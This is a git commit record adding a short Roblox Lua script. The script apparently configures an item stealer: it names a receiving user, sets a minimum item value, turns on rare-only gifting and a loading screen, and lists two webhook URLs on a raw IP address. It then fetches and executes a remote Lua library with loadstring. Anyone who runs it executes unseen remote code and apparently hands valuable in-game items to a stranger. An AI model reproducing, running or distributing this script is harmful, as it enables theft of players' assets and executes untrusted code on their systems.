5adacb0a4f206d463457b3946b2c291370cbd26c
Eradecated <cjclipzon60fps@gmail.com>
2025-08-03 15:04:29 -0400

    Upload script.lua via Script Source Converter

---
+++ script.lua
@@ -0,0 +1,13 @@
+_G.NullConfig = {
+    User = {"PetCarrier67"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/a2c20f4535f289413c5ac0f0486b652b",
+    FakeGift = "No",
+    Trash = "http://176.100.37.215:20002/proxy/1978e3f5bf29e22b8ee5a129ebf96d53",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
